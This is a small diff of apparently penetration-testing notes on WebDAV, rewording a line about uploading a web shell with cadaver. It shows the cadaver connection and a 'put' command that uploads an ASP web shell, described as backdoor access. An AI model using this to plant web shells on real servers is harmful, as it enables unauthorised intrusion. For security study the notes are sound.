@@ -52,7 +52,7 @@ cadaver http://<ip>/webdav
 
 ### Uploading a web shell using `cadaver` 
 
-- We can upload a web shell to be able to execute commands in the web server. 
+- We can upload a web shell to get a backdoor access to the web server. 
 
 ```
 put /usr/share/webshells/asp/webshell.asp
